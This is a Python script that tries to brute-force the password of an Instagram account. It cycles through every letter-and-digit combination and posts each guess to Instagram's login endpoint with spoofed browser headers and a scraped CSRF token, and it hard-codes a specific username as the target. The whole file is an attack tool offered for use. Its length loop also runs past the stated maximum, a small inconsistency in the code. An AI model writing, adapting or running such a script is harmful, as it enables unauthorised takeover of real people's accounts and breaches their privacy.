import itertools
import string
import requests
import time

# Adjust the character set to include digits and letters
chars = string.digits + string.ascii_letters  # Letters (both uppercase and lowercase) + digits

def brute_force_instagram(username, max_length=6, delay=0):
    # Instagram login URL
    login_url = 'https://www.instagram.com/accounts/login/ajax/'
    
    # Headers to mimic a browser request
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://www.instagram.com/accounts/login/',
        'x-csrftoken': 'missing',
    }
    
    # Start a session to maintain cookies
    session = requests.Session()
    session.headers.update(headers)
    
    # Get initial cookies and CSRF token
    session.get('https://www.instagram.com/accounts/login/')
    session.headers.update({'x-csrftoken': session.cookies.get('csrftoken')})
    
    # Function to try password
    def try_password(password):
        try:
            # Prepare login data
            login_data = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                'queryParams': {},
                'optIntoOneTap': 'false'
            }
            
            # Send login request
            response = session.post(login_url, data=login_data)
            result = response.json()
            
            print(f"Trying password: {password} - Status: {result.get('status')}")
            
            # Check if login was successful
            if result.get('authenticated'):
                print(f"Password found: {password}")
                return True
            return False
        except Exception as e:
            print(f"Error trying password {password}: {e}")
            return False
    
    # Brute-force all possible password combinations
    for length in range(1, max_length + 6):
        for password_tuple in itertools.product(chars, repeat=length):
            password = ''.join(password_tuple)
            if try_password(password):
                return password
            time.sleep(delay)  # Respectful delay to avoid rate limiting

# Example usage
username = 'html6859'  # The Instagram username to target
found_password = brute_force_instagram(username, max_length=6)
if found_password:
    print(f"Success! The password is: {found_password}")
else:
    print("Password not found with the given parameters.")